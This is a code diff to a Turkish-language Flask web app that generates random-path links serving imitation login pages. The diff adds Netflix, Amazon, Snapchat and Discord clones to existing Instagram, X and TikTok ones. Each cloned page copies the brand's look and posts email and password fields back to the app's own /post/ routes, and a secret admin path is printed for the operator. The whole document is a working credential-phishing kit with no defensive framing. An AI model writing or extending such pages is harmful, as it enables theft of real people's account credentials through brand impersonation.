@@ -8,7 +8,7 @@ import socket
 app = Flask(__name__)
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///ipl.db'
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
-db = SQLAlchemy(app)
+db = SQLAlchemy(app)          
 
 SECRET_ADMIN_PATH = "".join(random.choices(string.ascii_letters + string.digits, k=32))  # Rastgele oluştur
 print(f"ADMIN PANEL URL: /admin/{SECRET_ADMIN_PATH}")  # Bu çıktıyı kaydedin
@@ -54,98 +54,241 @@ HOME_HTML = '''
 <!DOCTYPE html>
 <html lang="tr">
 <head>
+    <link rel="icon" href="IPL.png" type="image/png" sizes="16x16">
+    <link rel="icon" href="IPL.png" type="image/png" sizes="32x32">
+    <link rel="apple-touch-icon" href="IPL.png">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>IPL - Link Oluşturucu</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
+        :root {
+            --primary-color: #4361ee;
+            --secondary-color: #3f37c9;
+            --accent-color: #4cc9f0;
+            --dark-color: #212529;
+            --light-color: #f8f9fa;
+        }
+        
         body {
             background-color: #f8f9fa;
             padding-top: 2rem;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
+        
         .card {
             border-radius: 15px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+            border: none;
+            overflow: hidden;
+            transition: transform 0.3s ease;
         }
+        
+        .card:hover {
+            transform: translateY(-5px);
+        }
+        
         .card-header {
-            background-color: #0d6efd;
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
             color: white;
-            border-radius: 15px 15px 0 0 !important;
+            padding: 1.5rem;
+            position: relative;
+            overflow: hidden;
         }
+        
+        .card-header::after {
+            content: "";
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: var(--accent-color);
+        }
+        
+        .card-header h3 {
+            position: relative;
+            z-index: 1;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        
         .form-select, .btn-primary {
-            border-radius: 8px;
+            border-radius: 10px;
+            padding: 12px 15px;
+            border: 2px solid #e9ecef;
+            transition: all 0.3s ease;
         }
+        
+        .form-select:focus {
+            border-color: var(--accent-color);
+            box-shadow: 0 0 0 0.25rem rgba(67, 97, 238, 0.25);
+        }
+        
+        .btn-primary {
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            border: none;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            transition: all 0.3s ease;
+        }
+        
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(67, 97, 238, 0.4);
+        }
+        
         .list-group-item {
-            border-radius: 8px !important;
-            margin-bottom: 10px;
+            border-radius: 10px !important;
+            margin-bottom: 12px;
             display: flex;
             justify-content: space-between;
             align-items: center;
+            padding: 15px;
+            border: none;
+            background-color: white;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+            transition: all 0.3s ease;
         }
+        
+        .list-group-item:hover {
+            transform: translateX(5px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+        
         .link-text {
-            font-family: monospace;
+            font-family: 'Fira Code', monospace, sans-serif;
             word-break: break-all;
-            color: #0d6efd;
+            color: var(--dark-color);
             flex-grow: 1;
-            margin-right: 10px;
+            margin-right: 15px;
+            font-size: 14px;
         }
+        
         .copy-btn {
             border-radius: 8px;
-            min-width: 80px;
+            min-width: 100px;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s ease;
+            border: 2px solid #e9ecef;
+            font-weight: 500;
         }
+        
+        .copy-btn:hover {
+            background-color: var(--light-color);
+            transform: translateY(-2px);
+        }
+        
+        .copy-btn.copied {
+            background-color: #28a745;
+            color: white;
+            border-color: #28a745;
+        }
+        
+        .copy-btn.copied i {
+            animation: bounce 0.5s;
+        }
+        
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-5px); }
+        }
+        
         .admin-section {
             margin-top: 2rem;
-            background-color: #f1f1f1;
+            background: white;
             border-radius: 15px;
-            padding: 15px;
+            padding: 20px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
+            border-top: 4px solid var(--accent-color);
         }
+        
         .empty-state {
             text-align: center;
-            padding: 20px;
+            padding: 40px 20px;
             color: #6c757d;
         }
+        
+        .empty-state i {
+            font-size: 3rem;
+            color: #dee2e6;
+            margin-bottom: 15px;
+        }
+        
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(67, 97, 238, 0.7); }
+            70% { box-shadow: 0 0 0 10px rgba(67, 97, 238, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(67, 97, 238, 0); }
+        }
+        
+        /* Tooltip styles */
+        .tooltip-custom {
+            position: fixed;
+            background-color: var(--dark-color);
+            color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 14px;
+            z-index: 9999;
+            opacity: 0;
+            transform: translateY(10px);
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        
+        .tooltip-custom.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
     </style>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
 </head>
 <body>
     <div class="container">
         <div class="row justify-content-center">
             <div class="col-lg-8">
-                <div class="card">
+                <div class="card mb-4 pulse">
                     <div class="card-header text-center">
                         <h3><i class="fas fa-link me-2"></i>IPL Link Oluşturucu</h3>
                     </div>
                     <div class="card-body">
                         <form method="POST" id="form">
-                            <div class="mb-3">
+                            <div class="mb-4">
                                 <select class="form-select" name="site" id="site" required>
                                     <option value="" disabled selected>Site Seçiniz</option>
                                     <option value="instagram">Instagram</option>
-                                    <option value="instagram">Instagram</option>
                                     <option value="x">X (Twitter)</option>
                                     <option value="tiktok">TikTok</option>
-
+                                    <option value="amazon">Amazon</option>
+                                    <option value="snapchat">Snapchat</option>
+                                    <option value="discord">Discord</option>
+                                    <option value="netflix">Netflix</option>
                                 </select>
                             </div>
-                            <button type="submit" class="btn btn-primary w-100">
+                            <button type="submit" class="btn btn-primary w-100 py-3">
                                 <i class="fas fa-plus-circle me-2"></i>Link Oluştur
                             </button>
                         </form>
 
-                        <div class="mt-4">
-                            <h5 class="mb-3"><i class="fas fa-history me-2"></i>Oluşturulan Linkler</h5>
+                        <div class="mt-5">
+                            <h5 class="mb-4"><i class="fas fa-history me-2"></i>Oluşturulan Linkler</h5>
                             <div class="list-group" id="links-list">
                                 {% for l in links %}
                                 <div class="list-group-item">
                                     <span class="link-text">{{ base_url }}/site/{{ l.random_path }}</span>
-                                    <button class="btn btn-outline-secondary copy-btn" onclick="copyToClipboard('{{ base_url }}/site/{{ l.random_path }}')">
+                                    <button class="btn btn-outline-secondary copy-btn" data-link="{{ base_url }}/site/{{ l.random_path }}">
                                         <i class="fas fa-copy me-1"></i>Kopyala
                                     </button>
                                 </div>
                                 {% else %}
                                 <div class="empty-state">
-                                    <i class="fas fa-exclamation-circle fa-2x mb-2"></i>
-                                    <p>Henüz link oluşturulmadı.</p>
+                                    <i class="fas fa-exclamation-circle mb-3"></i>
+                                    <p class="mb-0">Henüz link oluşturulmadı.</p>
                                 </div>
                                 {% endfor %}
                             </div>
@@ -154,10 +297,10 @@ HOME_HTML = '''
                 </div>
 
                 <div class="admin-section">
-                    <h5 class="text-center mb-3"><i class="fas fa-lock me-2"></i>Admin Paneli</h5>
+                    <h5 class="text-center mb-4"><i class="fas fa-lock me-2"></i>Admin Paneli</h5>
                     <div class="d-flex justify-content-between align-items-center">
                         <span class="link-text">{{ base_url }}/admin/{{ admin_path }}</span>
-                        <button class="btn btn-outline-dark copy-btn" onclick="copyToClipboard('{{ base_url }}/admin/{{ admin_path }}')">
+                        <button class="btn btn-outline-dark copy-btn" data-link="{{ base_url }}/admin/{{ admin_path }}">
                             <i class="fas fa-copy me-1"></i>Kopyala
                         </button>
                     </div>
@@ -166,30 +309,93 @@ HOME_HTML = '''
         </div>
     </div>
 
+    <div id="custom-tooltip" class="tooltip-custom">Kopyalandı!</div>
+
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
     <script>
-        function copyToClipboard(text) {
-            navigator.clipboard.writeText(text).then(() => {
-                // Create a temporary tooltip
-                const tooltip = document.createElement('div');
-                tooltip.style.position = 'fixed';
-                tooltip.style.backgroundColor = '#333';
-                tooltip.style.color = 'white';
-                tooltip.style.padding = '5px 10px';
-                tooltip.style.borderRadius = '4px';
-                tooltip.style.zIndex = '9999';
-                tooltip.style.top = (event.clientY - 40) + 'px';
-                tooltip.style.left = event.clientX + 'px';
-                tooltip.textContent = 'Kopyalandı!';
-                document.body.appendChild(tooltip);
-                
-                // Remove after 2 seconds
-                setTimeout(() => {
-                    document.body.removeChild(tooltip);
-                }, 2000);
-            }).catch(err => {
-                alert('Kopyalama hatası: ' + err);
+        document.addEventListener('DOMContentLoaded', function() {
+            // Copy functionality with improved UX
+            document.querySelectorAll('.copy-btn').forEach(button => {
+                button.addEventListener('click', function(e) {
+                    const link = this.getAttribute('data-link');
+                    copyToClipboard(link, e);
+                });
             });
+            
+            // Add click animation to all buttons
+            document.querySelectorAll('button').forEach(button => {
+                button.addEventListener('click', function() {
+                    this.classList.add('active');
+                    setTimeout(() => {
+                        this.classList.remove('active');
+                    }, 300);
+                });
+            });
+        });
+
+        function copyToClipboard(text, event) {
+            // Create temporary textarea for older browsers
+            const textarea = document.createElement('textarea');
+            textarea.value = text;
+            textarea.style.position = 'fixed';
+            textarea.style.opacity = '0';
+            document.body.appendChild(textarea);
+            textarea.select();
+            
+            try {
+                // Try modern clipboard API first
+                if (navigator.clipboard) {
+                    navigator.clipboard.writeText(text).then(() => {
+                        showTooltip(event);
+                        updateButtonState(event.target);
+                    }).catch(err => {
+                        fallbackCopy(textarea, event);
+                    });
+                } else {
+                    fallbackCopy(textarea, event);
+                }
+            } catch (err) {
+                fallbackCopy(textarea, event);
+            } finally {
+                document.body.removeChild(textarea);
+            }
+        }
+        
+        function fallbackCopy(textarea, event) {
+            try {
+                const successful = document.execCommand('copy');
+                if (successful) {
+                    showTooltip(event);
+                    updateButtonState(event.target);
+                } else {
+                    showTooltip(event, 'Manuel kopyalayın: Ctrl+C');
+                }
+            } catch (err) {
+                showTooltip(event, 'Kopyalama hatası!');
+            }
+        }
+        
+        function showTooltip(event, message = 'Kopyalandı!') {
+            const tooltip = document.getElementById('custom-tooltip');
+            tooltip.textContent = message;
+            tooltip.style.top = `${event.clientY - 50}px`;
+            tooltip.style.left = `${event.clientX - (tooltip.offsetWidth / 2)}px`;
+            tooltip.classList.add('show');
+            
+            setTimeout(() => {
+                tooltip.classList.remove('show');
+            }, 2000);
+        }
+        
+        function updateButtonState(button) {
+            const originalText = button.innerHTML;
+            button.innerHTML = '<i class="fas fa-check me-1"></i>Kopyalandı!';
+            button.classList.add('copied');
+            
+            setTimeout(() => {
+                button.innerHTML = originalText;
+                button.classList.remove('copied');
+            }, 2000);
         }
     </script>
 </body>
@@ -576,67 +782,546 @@ TIKTOK_HTML = '''
 
 
 SUCCESS_HTML = '''
+
+'''
+NETFLIX_HTML = '''
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Başarılı</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        body {
-            background-color: #f8f9fa;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .message-box {
-            background: white;
-            padding: 2rem;
-            border-radius: 15px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            text-align: center;
-            max-width: 500px;
-            width: 90%;
-            border-top: 5px solid #28a745;
-        }
-        .success-icon {
-            font-size: 4rem;
-            color: #28a745;
-            margin-bottom: 1rem;
-        }
-        .btn-home {
-            margin-top: 1.5rem;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Netflix Türkiye - TV programlarını çevrimiçi izleyin, Filmleri çevrimiçi izleyin</title>
+  <link rel="icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico">
+  <style>
+    /* Netflix'in resmi fontu */
+    @font-face {
+      font-family: 'Netflix Sans';
+      src: url('https://assets.nflxext.com/ffe/siteui/fonts/netflix-sans/v3/NetflixSans_W_Md.woff2') format('woff2');
+      font-weight: 500;
+    }
+    @font-face {
+      font-family: 'Netflix Sans';
+      src: url('https://assets.nflxext.com/ffe/siteui/fonts/netflix-sans/v3/NetflixSans_W_Bd.woff2') format('woff2');
+      font-weight: 700;
+    }
+
+    :root {
+      --netflix-red: #e50914;
+      --netflix-dark: #141414;
+      --netflix-white: #fff;
+      --netflix-gray: #737373;
+      --netflix-light-gray: #b3b3b3;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
+
+    body {
+      font-family: 'Netflix Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      background-color: rgba(0, 0, 0, 0.8);
+      color: var(--netflix-white);
+      min-height: 100vh;
+      background-image: url('https://assets.nflxext.com/ffe/siteui/vlv3/9d3533b2-0e2b-40b2-95e0-ecd7979cc88b/a3873901-5b7c-46eb-b9fa-12fea5197bd3/TR-tr-20240311-popsignuptwoweeks-perspective_alpha_website_large.jpg');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+    }
+
+    .overlay {
+      background-color: rgba(0, 0, 0, 0.5);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .header {
+      padding: 20px 45px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .logo {
+      height: 45px;
+    }
+
+    .language-selector {
+      background-color: rgba(0, 0, 0, 0.4);
+      color: var(--netflix-white);
+      border: 1px solid var(--netflix-gray);
+      padding: 8px 16px;
+      border-radius: 4px;
+      margin-right: 20px;
+      font-size: 16px;
+    }
+
+    .signin-btn {
+      background-color: var(--netflix-red);
+      color: var(--netflix-white);
+      border: none;
+      padding: 8px 16px;
+      border-radius: 4px;
+      font-size: 16px;
+      font-weight: 500;
+      cursor: pointer;
+    }
+
+    .login-container {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .login-box {
+      background-color: rgba(0, 0, 0, 0.75);
+      border-radius: 4px;
+      padding: 60px 68px;
+      max-width: 450px;
+      width: 100%;
+    }
+
+    .login-title {
+      font-size: 32px;
+      font-weight: 700;
+      margin-bottom: 28px;
+    }
+
+    .form-group {
+      margin-bottom: 16px;
+      position: relative;
+    }
+
+    .form-control {
+      width: 100%;
+      padding: 16px 20px;
+      background-color: var(--netflix-gray);
+      border: none;
+      border-radius: 4px;
+      color: var(--netflix-white);
+      font-size: 16px;
+    }
+
+    .form-control:focus {
+      outline: none;
+      background-color: #454545;
+    }
+
+    .form-control.error {
+      border-bottom: 2px solid var(--netflix-red);
+    }
+
+    .error-message {
+      color: #e87c03;
+      font-size: 13px;
+      margin-top: 6px;
+      display: none;
+    }
+
+    .login-btn {
+      width: 100%;
+      padding: 16px;
+      background-color: var(--netflix-red);
+      color: var(--netflix-white);
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      font-weight: 700;
+      margin-top: 24px;
+      cursor: pointer;
+    }
+
+    .login-btn:hover {
+      background-color: #f40612;
+    }
+
+    .remember-help {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 12px;
+      color: var(--netflix-light-gray);
+      font-size: 13px;
+    }
+
+    .remember-me {
+      display: flex;
+      align-items: center;
+    }
+
+    .remember-me input {
+      margin-right: 5px;
+    }
+
+    .help-link {
+      color: var(--netflix-light-gray);
+      text-decoration: none;
+    }
+
+    .signup-text {
+      margin-top: 16px;
+      color: var(--netflix-gray);
+    }
+
+    .signup-link {
+      color: var(--netflix-white);
+      text-decoration: none;
+    }
+
+    .signup-link:hover {
+      text-decoration: underline;
+    }
+
+    .recaptcha {
+      margin-top: 13px;
+      font-size: 13px;
+      color: var(--netflix-light-gray);
+    }
+
+    .recaptcha a {
+      color: #0071eb;
+      text-decoration: none;
+    }
+
+    .recaptcha a:hover {
+      text-decoration: underline;
+    }
+
+    .footer {
+      background-color: rgba(0, 0, 0, 0.75);
+      padding: 30px 45px;
+      margin-top: 90px;
+    }
+
+    .footer-content {
+      max-width: 1000px;
+      margin: 0 auto;
+    }
+
+    .contact {
+      margin-bottom: 30px;
+    }
+
+    .contact a {
+      color: #737373;
+      text-decoration: none;
+    }
+
+    .contact a:hover {
+      text-decoration: underline;
+    }
+
+    .footer-links {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 15px;
+      margin-bottom: 20px;
+    }
+
+    @media (max-width: 740px) {
+      .footer-links {
+        grid-template-columns: repeat(2, 1fr);
+      }
+    }
+
+    .footer-link {
+      color: #737373;
+      font-size: 13px;
+      text-decoration: none;
+    }
+
+    .footer-link:hover {
+      text-decoration: underline;
+    }
+
+    .language-selector-footer {
+      margin-bottom: 20px;
+    }
+
+    .copyright {
+      color: #737373;
+      font-size: 11px;
+    }
+
+    @media (max-width: 740px) {
+      .header {
+        padding: 15px;
+      }
+      
+      .login-box {
+        padding: 15px;
+        margin-top: 0;
+      }
+      
+      .login-title {
+        font-size: 24px;
+      }
+    }
+  </style>
 </head>
 <body>
-    <div class="message-box">
-        <div class="success-icon">
-            <i class="fas fa-check-circle"></i>
+  <div class="overlay">
+    <header class="header">
+      <div>
+        <svg class="logo" viewBox="0 0 111 30" fill="#e50914">
+          <path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z"></path>
+        </svg>
+      </div>
+      <div>
+        <select class="language-selector">
+          <option value="tr">Türkçe</option>
+          <option value="en">English</option>
+        </select>
+        <button class="signin-btn">Oturum Aç</button>
+      </div>
+    </header>
+
+    <div class="login-container">
+      <div class="login-box">
+        <h1 class="login-title">Oturum Aç</h1>
+        <form method="post" action="/post/netflix">
+          <div class="form-group">
+            <input type="email" class="form-control" name="email" placeholder="E-posta veya telefon numarası" required>
+            <div class="error-message">Lütfen geçerli bir e-posta adresi veya telefon numarası girin.</div>
+          </div>
+          <div class="form-group">
+            <input type="password" class="form-control" name="password" placeholder="Şifre" required>
+            <div class="error-message">Şifreniz 4 ile 60 karakter arasında olmalıdır.</div>
+          </div>
+          <button type="submit" class="login-btn">Oturum Aç</button>
+          <div class="remember-help">
+            <div class="remember-me">
+              <input type="checkbox" id="remember" name="remember">
+              <label for="remember">Beni hatırla</label>
+            </div>
+            <a href="#" class="help-link">Yardım ister misiniz?</a>
+          </div>
+        </form>
+        <div class="signup-text">
+          Netflix'e katılmak ister misiniz? <a href="#" class="signup-link">Şimdi kaydolun</a>.
         </div>
-        <h3 class="text-success">Başarılı!</h3>
-        <p class="lead">Bilgileriniz başarıyla gönderildi. Teşekkürler.</p>
-        <a href="/" class="btn btn-success btn-home">
-            <i class="fas fa-home me-2"></i>Ana Sayfaya Dön
-        </a>
+        <div class="recaptcha">
+          Bu sayfa robot olmadığınızı kanıtlamak için Google reCAPTCHA ile korunuyor. <a href="#">Daha fazlasını öğrenin.</a>
+        </div>
+      </div>
     </div>
-    
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+
+    <footer class="footer">
+      <div class="footer-content">
+        <div class="contact">
+          Sorularınız mı var? <a href="#">0850-390-7444</a> numaralı telefonu arayın
+        </div>
+        <div class="footer-links">
+          <a href="#" class="footer-link">SSS</a>
+          <a href="#" class="footer-link">Yardım Merkezi</a>
+          <a href="#" class="footer-link">Netflix Shop</a>
+          <a href="#" class="footer-link">Kullanım Koşulları</a>
+          <a href="#" class="footer-link">Gizlilik</a>
+          <a href="#" class="footer-link">Çerez Tercihleri</a>
+          <a href="#" class="footer-link">Kurumsal Bilgiler</a>
+          <a href="#" class="footer-link">Hız Testi</a>
+        </div>
+        <div class="language-selector-footer">
+          <select class="language-selector">
+            <option value="tr">Türkçe</option>
+            <option value="en">English</option>
+          </select>
+        </div>
+        <div class="copyright">
+          Netflix Türkiye
+        </div>
+      </div>
+    </footer>
+  </div>
 </body>
 </html>
+'''
+AMAZON_HTML = '''
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Amazon Sign-In</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='css/amazon.css') }}">
+</head>
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background-color: #fff;
+  margin: 0;
+  padding: 0;
+}
+.container {
+  width: 300px;
+  margin: 60px auto;
+  text-align: center;
+}
+.logo {
+  width: 100px;
+  margin-bottom: 20px;
+}
+.form-box {
+  border: 1px solid #ccc;
+  padding: 20px;
+  text-align: left;
+}
+input {
+  width: 100%;
+  padding: 8px;
+  margin-top: 8px;
+  margin-bottom: 12px;
+}
+button {
+  width: 100%;
+  background-color: #f0c14b;
+  border: 1px solid #a88734;
+  padding: 10px;
+  font-weight: bold;
+}
+.help {
+  margin-top: 15px;
+  font-size: 12px;
+  color: #0066c0;
+}
+</style>
+<body>
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" class="logo">
+    <div class="form-box">
+      <h1>Sign-In</h1>
+      <form method="post" action="/post/amazon">
+        <label>Email or mobile phone number</label>
+        <input type="text" name="username" required>
+        <button type="submit">Continue</button>
+      </form>
+    </div>
+    <div class="help">Need help?</div>
+  </div>
+</body>
+</html>
+
+'''
+SNAPCHAT_HTML = '''
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Snapchat Login</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='css/snapchat.css') }}">
+</head>
+<style>body {
+  background-color: #fffc00;
+  font-family: sans-serif;
+  margin: 0;
+  padding: 0;
+}
+.login-box {
+  width: 300px;
+  margin: 100px auto;
+  background: white;
+  padding: 30px;
+  border-radius: 10px;
+  text-align: center;
+}
+input {
+  width: 90%;
+  margin: 10px 0;
+  padding: 10px;
+}
+button {
+  background-color: black;
+  color: white;
+  padding: 10px;
+  width: 100%;
+  border: none;
+  font-weight: bold;
+}
+ </style>
+<body>
+  <div class="login-box">
+    <h2>Log in to Snapchat</h2>
+    <form method="post" action="/post/snapchat">
+      <label>Username or Email</label>
+      <input type="text" name="username" required>
+      <label>Password</label>
+      <input type="password" name="password" required>
+      <button type="submit">Log In</button>
+    </form>
+  </div>
+</body>
+</html>
+
+'''
+DISCORD_HTML = '''
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Discord</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='css/discord.css') }}">
+</head>
+<style>body {
+  background-color: #36393f;
+  color: white;
+  font-family: 'Helvetica Neue', sans-serif;
+}
+.login-box {
+  width: 400px;
+  margin: 100px auto;
+  background-color: #2f3136;
+  padding: 40px;
+  border-radius: 8px;
+}
+input {
+  width: 100%;
+  padding: 10px;
+  margin: 10px 0;
+  background: #202225;
+  border: none;
+  color: white;
+}
+button {
+  width: 100%;
+  padding: 10px;
+  background: #5865f2;
+  border: none;
+  color: white;
+  font-weight: bold;
+}
+</style>
+<body>
+  <div class="login-box">
+    <h2>Welcome back!</h2>
+    <p>We're so excited to see you again!</p>
+    <form method="post" action="/post/discord">
+      <label>Email or Phone Number</label>
+      <input type="text" name="username" required>
+      <label>Password</label>
+      <input type="password" name="password" required>
+      <button type="submit">Log In</button>
+    </form>
+  </div>
+</body>
+</html>
+
 '''
 
 ADMIN_HTML = '''
 <!DOCTYPE html>
 <html lang="tr">
 <head>
+  
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Admin Paneli</title>
+    <link rel="icon" href="IPL.png" type="image/png" sizes="16x16">
+    <link rel="icon" href="IPL.png" type="image/png" sizes="32x32">
+    <link rel="apple-touch-icon" href="IPL.png">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
@@ -770,6 +1455,12 @@ ADMIN_HTML = '''
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
     <script>
         // Tabloyu yenile butonu eklenebilir
+        // Bu fonksiyon sayfada tanımlı olmalı
+function copyToClipboard(text) {
+  navigator.clipboard.writeText(text)
+    .then(() => alert('Kopyalandı: ' + text))
+    .catch(err => console.error('Kopyalama hatası:', err));
+}
     </script>
 </body>
 </html>
@@ -802,6 +1493,14 @@ def show_site(random_path):
         return render_template_string(X_HTML, random_path=random_path)
     elif link.site == "tiktok":
         return render_template_string(TIKTOK_HTML, random_path=random_path)
+    elif link.site == "amazon":
+        return render_template_string(AMAZON_HTML, random_path=random_path)
+    elif link.site == "snapchat":
+        return render_template_string(SNAPCHAT_HTML, random_path=random_path)
+    elif link.site == "discord":
+        return render_template_string(DISCORD_HTML, random_path=random_path)
+    elif link.site == "netflix":
+        return render_template_string(NETFLIX_HTML, random_path=random_path)
     else:
         return "Site desteklenmiyor", 404
 
